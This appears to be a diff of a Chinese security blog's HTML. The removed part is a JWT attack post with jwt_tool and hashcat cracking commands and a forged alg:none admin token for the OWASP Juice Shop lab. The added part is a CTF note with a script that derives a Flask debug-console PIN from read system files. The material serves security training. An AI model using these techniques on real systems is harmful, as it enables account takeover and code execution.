-
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726651911901-cc491e80-1b80-4953-8697-e2778380d820.png"></p>
-<h4 id="查看jwt的值"><a href="#查看jwt的值" class="headerlink" title="查看jwt的值"></a>查看jwt的值</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726651958629-20dac402-078e-4947-a31d-8548d54a9f57.png"></p>
-<p><img src="/2025/03/26/JWT%E6%94%BB%E5%87%BB/1726652090301-e7491b40-9eff-4e0f-bf70-8b16727f848f.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652124762-1ad8ee68-6e76-4b14-aa95-23ea792d62e3.png"></p>
-<h4 id="X-a-设置签名为空"><a href="#X-a-设置签名为空" class="headerlink" title="-X a 设置签名为空"></a>-X a 设置签名为空</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoidXNlcnMifQ.PcT7hCKp4B275nb8uy3tTNr_lYSws0VZldtIRQy43fcNe3B2F5Fv3pzqHr6vA50eBeMFbUfwJoCUoqPtOHXNp-_uH63ZfHZMZmreNngIHQ8D2Uo6Tg2NMR-YOYOX3Mz9UOeQsbk48X9U0t8L-pi2qDQUTEloaBaWLSCVQIfhyDablIOtzAc45FWwfuR5PgydWmc1COunDSEs9QNl_klbtjK6VSv46VY35P2ljyW2sLPasa1iZG68QVYmzWpq629T8_tbGcGngCDfTMK4jD4hWarhvBeEkpACAGvxlyoFclYlwcDLMSmPt8FwvDy2iQLL6dvN1NuCP629Zt-U7p7hWA -X a</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">查看帮助手册得知：</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;-X a&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">的作用是设置</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;alg&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">为</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;none&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">，即：设置签名为空。</font><br><font style="color:rgb(77, 77, 77);">可以看到工具生成了四种不同 none 值对应的 payload ，实际测试中可以逐一替换进行测试，同时也可尝试将“alg”字段直接置空（使用</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;-X n&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">）。</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652201518-30252e3b-43b6-4522-ae2c-6b59a372c7c6.png"></p>
-<p><font style="color:rgb(77, 77, 77);">base64解码得知，用户名没变，所以还需要把拿到的结果，手工修改才行。</font></p>
-<p><img src="/2025/03/26/JWT%E6%94%BB%E5%87%BB/1726652251245-1803ea37-bc5c-4f84-8551-340e6fe2aea5.png"></p>
-<p><font style="color:rgb(77, 77, 77);">经过上面的演示，个人感觉这个功能没啥用。</font></p>
-<p><font style="color:rgb(77, 77, 77);"></font></p>
-<h4 id="破解密钥"><a href="#破解密钥" class="headerlink" title="破解密钥"></a><font style="color:rgb(77, 77, 77);">破解密钥</font></h4><p><a target="_blank" rel="noopener" href="https://authlab.digi.ninja/JWT_Cracking">https://authlab.digi.ninja/JWT_Cracking</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用字典破解</span></span><br><span class="line">python3 jwt_tool.py JWT_HERE -C -d dictionary.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定密码</span></span><br><span class="line">python3 jwt_tool.py JWT_HERE -C -p password_here</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652362766-99ce0db0-6a8a-429f-8652-b0d9b80c95ad.png"></p>
-<p>假如字典没爆破出来，jwt会提示让我们用hashcat工具，并且给出了代码示例。</p>
-<p>我们只要将jwt数据保存到一个文件中，然后看情况执行它给的命令。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769547530-1ebf6411-f2f3-4f91-b111-a4591e2affe5.png"></p>
-<p>演示：</p>
-<p>由于该例中，以及知道jwt由6位数字构成，所以直接掩码爆破</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769691045-fc7be289-e63d-4e58-93c1-d06865599de1.png"></p>
-<p>成功拿到密钥</p>
-<h4 id="生成签名后的JWT"><a href="#生成签名后的JWT" class="headerlink" title="生成签名后的JWT"></a>生成签名后的JWT</h4><p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
-<p><font style="color:rgb(77, 77, 77);">首先是得破解出密钥，然后来到</font><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a><font style="color:rgb(77, 77, 77);">篡改payload（但是在这个网站上填写密钥就可以生成签名了，没必要再去工具中让他生成了）</font></p>
-<p><font style="color:rgb(77, 77, 77);"></font></p>
-<p><font style="color:rgb(77, 77, 77);">假如我们知道对方是怎么加密的，我们可用照着它加密的方法再加密：</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769774631-712b05d8-8d11-4519-83fd-bfeabefe982e.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769867033-e4b39f71-2217-49ba-91dd-54ae245c667d.png"></p>
-<p>这题是由于源码泄露，我们知道了对方是如何加密解密的。我们伪造token的时候用同样的方法即可。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769803465-68eef619-0516-4cda-802e-0003096cd07e.png"></p>
-<p>如果这里直接用jwt.io改的话，会失败，对方还设置了time。只好用python了。</p>
-<h2 id="案例1：Owasp-Juice-Shop"><a href="#案例1：Owasp-Juice-Shop" class="headerlink" title="案例1：Owasp Juice Shop"></a>案例1：Owasp Juice Shop</h2><p>通过此案例，了解最基本的利用方式，以及一些注意事项！</p>
-<p>你可以使用在线靶场：<a target="_blank" rel="noopener" href="https://juice-shop.herokuapp.com/">https://juice-shop.herokuapp.com/</a></p>
-<p>或者本地docker搭建：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull bkimminich/juice-shop</span><br><span class="line">docker run -d -p <span class="number">80</span>:<span class="number">3000</span> bkimminich/juice-shop</span><br></pre></td></tr></table></figure>
-
-<p>如何攻击？思路是，尝试设置 JWT 的加密方式为空，这样我可以自行设计出 JWT 的前两部分，第三部分置为空。然后通过修改账号密码的方式来重置管理员的密码。开始演示。</p>
-<h3 id="1-发现JWT登录"><a href="#1-发现JWT登录" class="headerlink" title="1. 发现JWT登录"></a><font style="color:rgb(79, 79, 79);">1. 发现JWT登录</font></h3><p><font style="color:rgb(77, 77, 77);">注册账户：<a href="mailto:&#49;&#x32;&#51;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;">123@qq.com</a>，123456登录系统，发现存在 JWT。并且注意到</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Authorization&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">与</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Cookie&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">中</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;token&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">的值是一致的。</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652702210-b872e40b-fd45-4d0b-9e93-092cbd05c9f7.png"></p>
-<h3 id="2-发现网站邮箱格式"><a href="#2-发现网站邮箱格式" class="headerlink" title="2. 发现网站邮箱格式"></a><font style="color:rgb(79, 79, 79);">2. 发现网站邮箱格式</font></h3><p><font style="color:rgb(77, 77, 77);">浏览网页，发现网站使用的邮箱格式：</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;@juice-sh.op&lt;/font&gt;</code></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652746782-3dc2f5aa-3d56-4075-97d1-7b16af8a433d.png"></p>
-<h3 id="3-修改-JWT"><a href="#3-修改-JWT" class="headerlink" title="3. 修改 JWT"></a><font style="color:rgb(79, 79, 79);">3. 修改 JWT</font></h3><p><font style="color:rgb(77, 77, 77);">请求头Authorization的值为：</font></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIxMjNAcXEuY29tIiwicGFzc3dvcmQiOiJlMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZSIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMS0xNiAwNTozOTo0NS43MDcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0xMS0xNiAwNTo0NDowNC41MjMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjY4NTc3NDU3LCJleHAiOjE2Njg1OTU0NTd9.DXYw24kJYuBcHxuWHEocNupJzjocpCWAoZPByvaJgcZ5K2CXUXYpBYdHCy7L6DZD_Od9Xh7DNJUdfP__6gwLVQ9LJ7k98af3cLBhQ_M7TW2TtoXOOcZzkVnVuN0QW1w7bTK4venFwSeWDuOshpF_fFWGlxd42y4kOS2as2cb5xo</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);">来到专业网站分析如下：</font><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a><br><font style="color:rgb(77, 77, 77);">根据多年口算MD5的经验得知，密码的加密方式是MD5</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652790038-bb15a3b8-9957-410a-97e9-b88e39d751fa.png"></p>
-<p><font style="color:rgb(77, 77, 77);">接下来篡改 JWT 的内容（不要base64编码结果最后面的等号！）</font><br><strong><font style="color:rgb(77, 77, 77);">修改得到JWT第一部分：</font></strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652816500-6e1c4125-8e0e-4818-8789-0c0fbb07e31a.png"></p>
-<p><strong><font style="color:rgb(77, 77, 77);">修改得到JWT第二部分：</font></strong><font style="color:rgb(77, 77, 77);"></font></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogIiIsCiAgICAiZW1haWwiOiAiYWRtaW5AanVpY2Utc2gub3AiLAogICAgInBhc3N3b3JkIjogImUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNlIiwKICAgICJyb2xlIjogImN1c3RvbWVyIiwKICAgICJkZWx1eGVUb2tlbiI6ICIiLAogICAgImxhc3RMb2dpbklwIjogInVuZGVmaW5lZCIsCiAgICAicHJvZmlsZUltYWdlIjogIi9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwKICAgICJ0b3RwU2VjcmV0IjogIiIsCiAgICAiaXNBY3RpdmUiOiB0cnVlLAogICAgImNyZWF0ZWRBdCI6ICIyMDIyLTExLTE2IDA1OjM5OjQ1LjcwNyArMDA6MDAiLAogICAgInVwZGF0ZWRBdCI6ICIyMDIyLTExLTE2IDA1OjQ0OjA0LjUyMyArMDA6MDAiLAogICAgImRlbGV0ZWRBdCI6IG51bGwKICB9LAogICJpYXQiOiAxNjY4NTc3NDU3LAogICJleHAiOiAxNjY4NTk1NDU3Cn0</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652931402-358a0dc4-7bfd-4412-8f0a-7b3a6e5ebeb7.png"></p>
-<p><strong><font style="color:rgb(77, 77, 77);">由于加密方式为空，因此第三部分为空，于是得到篡改后的JWT如下：</font></strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0.ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogIiIsCiAgICAiZW1haWwiOiAiYWRtaW5AanVpY2Utc2gub3AiLAogICAgInBhc3N3b3JkIjogImUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNlIiwKICAgICJyb2xlIjogImN1c3RvbWVyIiwKICAgICJkZWx1eGVUb2tlbiI6ICIiLAogICAgImxhc3RMb2dpbklwIjogInVuZGVmaW5lZCIsCiAgICAicHJvZmlsZUltYWdlIjogIi9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwKICAgICJ0b3RwU2VjcmV0IjogIiIsCiAgICAiaXNBY3RpdmUiOiB0cnVlLAogICAgImNyZWF0ZWRBdCI6ICIyMDIyLTExLTE2IDA1OjM5OjQ1LjcwNyArMDA6MDAiLAogICAgInVwZGF0ZWRBdCI6ICIyMDIyLTExLTE2IDA1OjQ0OjA0LjUyMyArMDA6MDAiLAogICAgImRlbGV0ZWRBdCI6IG51bGwKICB9LAogICJpYXQiOiAxNjY4NTc3NDU3LAogICJleHAiOiAxNjY4NTk1NDU3Cn0.</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-验证是否存在漏洞"><a href="#4-验证是否存在漏洞" class="headerlink" title="4. 验证是否存在漏洞"></a><font style="color:rgb(79, 79, 79);">4. 验证是否存在漏洞</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652972360-12122cd0-b112-45dd-b637-dd5aa4b025b6.png"></p>
-<h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5. 漏洞利用"></a><font style="color:rgb(79, 79, 79);">5. 漏洞利用</font></h3><p><font style="color:rgb(77, 77, 77);">修改自己账号的密码，抓包发现，与我当前账户身份相关的只有</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Authorization&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">和</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Cookie&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">的</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;token&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">值，并没有邮箱、用户名之类的东西。那就直接篡改</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653016013-d21af7be-125d-4466-b26e-a7e5d35e1ec2.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653022208-1635f4b7-db00-41bc-9735-5c955e8d8e4b.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653029905-c90410e7-2a92-4c49-b138-0750a168e9a2.png"></p>
-<h2 id="案例2：BurpSuite"><a href="#案例2：BurpSuite" class="headerlink" title="案例2：BurpSuite"></a><font style="color:rgb(79, 79, 79);">案例2：BurpSuite</font></h2><h3 id="案例2-1：接受任意签名"><a href="#案例2-1：接受任意签名" class="headerlink" title="案例2.1：接受任意签名"></a><font style="color:rgb(79, 79, 79);">案例2.1：接受任意签名</font></h3><p><strong><font style="color:rgb(77, 77, 77);">漏洞靶场：通过未验证签名绕过 JWT 身份验证（</font></strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature"><font style="color:rgb(77, 77, 77);">JWT authentication bypass via unverified signature</font></a><strong><font style="color:rgb(77, 77, 77);">）</font></strong><font style="color:rgb(77, 77, 77);"><br></font><font style="color:rgb(77, 77, 77);">本实验使用基于 JWT 的机制来处理会话。由于实施缺陷，服务器不会验证它收到的任何 JWT 的签名。</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653219660-0c781b9c-887b-465d-9218-474fdd697419.png"></p>
-<h3 id="案例2-2：接受未签名的令牌"><a href="#案例2-2：接受未签名的令牌" class="headerlink" title="案例2.2：接受未签名的令牌"></a><font style="color:rgb(79, 79, 79);">案例2.2：接受未签名的令牌</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653310635-c161d89f-f7ef-4cb7-8f3c-2aaf148a376c.png"></p>
-<h3 id="案例2-3：暴力破解密钥"><a href="#案例2-3：暴力破解密钥" class="headerlink" title="案例2.3：暴力破解密钥"></a><font style="color:rgb(79, 79, 79);">案例2.3：暴力破解密钥</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653373531-f16fd88b-b0ff-4cf1-a2ef-b45e4cfde56f.png"></p>
-<h3 id="案例2-5：jku参数注入攻击"><a href="#案例2-5：jku参数注入攻击" class="headerlink" title="案例2.5：jku参数注入攻击"></a><font style="color:rgb(79, 79, 79);">案例2.5：jku参数注入攻击</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653912686-c5a2277d-36bc-427c-9f67-27004ec6a361.png"></p>
-<h3 id="案例2-6：kid参数注入攻击"><a href="#案例2-6：kid参数注入攻击" class="headerlink" title="案例2.6：kid参数注入攻击"></a><font style="color:rgb(79, 79, 79);">案例2.6：kid参数注入攻击</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653945214-1571053c-cdd5-443f-9015-46226c955385.png"></p>
-<h3 id="案例2-7：算法混淆攻击"><a href="#案例2-7：算法混淆攻击" class="headerlink" title="案例2.7：算法混淆攻击"></a><font style="color:rgb(79, 79, 79);">案例2.7：算法混淆攻击</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726653977895-c253f15a-5d7b-4fc4-b3b1-c3014e2f5fc9.png"></p>
-<h3 id="案例2-8：从现有令牌派生公钥"><a href="#案例2-8：从现有令牌派生公钥" class="headerlink" title="案例2.8：从现有令牌派生公钥"></a><font style="color:rgb(79, 79, 79);">案例2.8：从现有令牌派生公钥</font></h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726654018471-5fa494ce-afca-4560-a393-5825f3a0cdc5.png"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2025/03/26/JWT%E6%94%BB%E5%87%BB/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-常用姿势" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/03/31/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/">常用姿势</a>
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:04:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="flask算pin"><a href="#flask算pin" class="headerlink" title="flask算pin"></a>flask算pin</h1><p>要计算PIN码，需要private_bits 和public_bits </p>
+        <hr>
+<h1 id="flask算pin"><a href="#flask算pin" class="headerlink" title="flask算pin"></a>flask算pin</h1><p>要计算PIN码，需要private_bits 和public_bits </p>
 <p>分别需要确定的是：</p>
 <p>1 当前用户名</p>
 <p>2 固定值  flask.app</p>
@@ -803,19 +171,19 @@
 <p>5 uuid.getnode</p>
 <p>6 machine_id</p>
 <p>例题：</p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514731438-da3c0323-0146-4ed9-b9b3-7e2cdeb341ec.png"></p>
+<p><img src="/2025/03/31/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514731438-da3c0323-0146-4ed9-b9b3-7e2cdeb341ec.png"></p>
 <p>明显是要我们算pin码。</p>
 <p>1.获取脚本运行绝对路径：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py</p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514720696-5f6d6e43-8186-4bdc-b5fb-24fdbfb0dc66.png"></p>
+<p><img src="/2025/03/31/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514720696-5f6d6e43-8186-4bdc-b5fb-24fdbfb0dc66.png"></p>
 <p>2.获取uuid：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514816321-f41e4e3d-1506-4e7d-b621-27d5e8b2941a.png"></p>
+<p><img src="/2025/03/31/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514816321-f41e4e3d-1506-4e7d-b621-27d5e8b2941a.png"></p>
 <p><font style="color:rgb(0, 0, 0);">0242ac0cbf01—&gt;16进制转十进制：2485377613569</font></p>
 <p><font style="color:rgb(0, 0, 0);"></font></p>
 <p><font style="color:rgb(0, 0, 0);">3.machine_id</font></p>
 <p><font style="color:rgb(0, 0, 0);">&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</font></p>
 <p><font style="color:rgb(0, 0, 0);">&#x2F;proc&#x2F;self&#x2F;cgroup</font></p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515082645-18779643-005d-43b0-a425-4a417682d3f0.png"></p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515109991-4a648aef-4b58-4771-ad49-c20c2e32ba81.png"></p>
+<p><img src="/2025/03/31/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515082645-18779643-005d-43b0-a425-4a417682d3f0.png"></p>
+<p><img src="/2025/03/31/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515109991-4a648aef-4b58-4771-ad49-c20c2e32ba81.png"></p>
 <p>两者拼接一下就是machine_id</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">225374fa-04bc-4346-9f39-48fa82829ca9627fb8d9e1725d1ffe910f52a89506be87d771bf863b1441fafaa02075c02fa1</span><br></pre></td></tr></table></figure>
 
@@ -825,7 +193,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPIN</span>(<span class="params">public_bits, private_bits</span>):</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    public_bits = [</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"> </span><br><span class="line">    private_bits = [</span><br><span class="line">        <span class="string">&#x27;2485377605532&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;225374fa-04bc-4346-9f39-48fa82829ca9b411d864f4e593f4e388782956b10f2d5e11871e2ae5c13bc45e5e8cd18a766d&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"> </span><br><span class="line">    PIN = getPIN(public_bits, private_bits)</span><br><span class="line">    <span class="built_in">print</span>(PIN)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737515451817-dfc76c5a-546c-47e5-b109-8829ff120c39.png"></p>
